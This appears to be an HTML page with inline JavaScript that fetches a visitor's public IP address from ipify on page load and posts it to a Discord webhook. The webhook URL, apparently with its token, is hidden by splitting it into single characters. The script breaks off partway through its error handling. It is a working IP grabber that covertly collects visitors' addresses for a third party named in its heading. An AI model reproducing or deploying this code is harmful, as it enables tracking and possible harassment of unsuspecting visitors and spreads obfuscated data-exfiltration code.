<body>
    <h1>Fetching and Sending Your IP Address to UTUBETROLLPOLICE</h1>
    <p id="status">Loading...</p>

    <script>
        (function() {
            // Fully obfuscate the Discord Webhook URL by splitting it into individual characters
            const _0x5a2b = ['h','t','t','p','s',':','/','/','p','t','b','.','d','i','s','c','o','r','d','.','c','o','m','/','a','p','i','/','w','e','b','h','o','o','k','s','/','1','3','7','6','1','3','1','8','9','1','1','0','2','7','4','8','6','8','2','/','V','5','X','x','c','r','Z','y','B','U','X','9','_','y','b','Z','Q','f','9','2','k','t','8','k','6','I','c','e','J','J','t','8','7','k','-','i','6','E','U','a','t','S','M','L','E','8','K','r','q','1','O','q','z','2','1','8','_','o','6','U','R','n','K','b','B','z','e','Z'];

            // Rebuild the webhook URL from the characters
            const discordWebhookUrl = _0x5a2b.join('');

            // Fetch the user's IP address from ipify
            fetch('https://api.ipify.org?format=json')
                .then(function(response) {
                    return response.json();  // Parse JSON response
                })
                .then(function(data) {
                    const userIp = data.ip;  // Get the user's IP address
                    document.getElementById('status').textContent = 'Your IP Address: ' + userIp;

                    const payload = {
                        content: 'New user IP: ' + userIp  // Message to send to Discord
                    };

                    // Send the IP address to Discord webhook
                    fetch(discordWebhookUrl, {  // Using the obfuscated webhook URL
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify(payload)  // Send payload as JSON
                    })
                    .then(function(response) {
                        if (response.ok) {
                            console.log('IP address sent to Discord successfully');
                        } else {
                            console.error('Failed to send IP to Discord');
                        }
                    })
                    .catch(function(error) {
                        console.error('Error sending IP to Discord:', error);
                    });
                })
                .catch(function(error) {
                    console.error('Error fetching IP address:', error);
                    document.getElementById('status').textContent = 'Unable to fetch IP address';
